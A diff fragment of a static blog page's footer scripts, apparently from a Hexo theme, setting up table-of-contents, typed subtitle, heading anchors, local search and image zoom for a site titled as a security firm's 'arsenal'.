+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
       }
-      var lang = figure.attr('class').split(' ')[1] || 'code';
-      var codeHtml = $(this).html();
-      var codeTag = document.createElement('code');
-      codeTag.className = lang;
-      codeTag.innerHTML = codeHtml;
-      $(this).attr('class', '').empty().html(codeTag);
-      figure.attr('data-lang', lang.toUpperCase());
-      hljs.highlightBlock(block);
     });
-  })
-</script>
-<!-- Baidu Tongji -->
+  </script>
 
 
-<script src="/js/script.js"></script>
 
-  </body>
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "斗象科技-武器库&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
 </html>
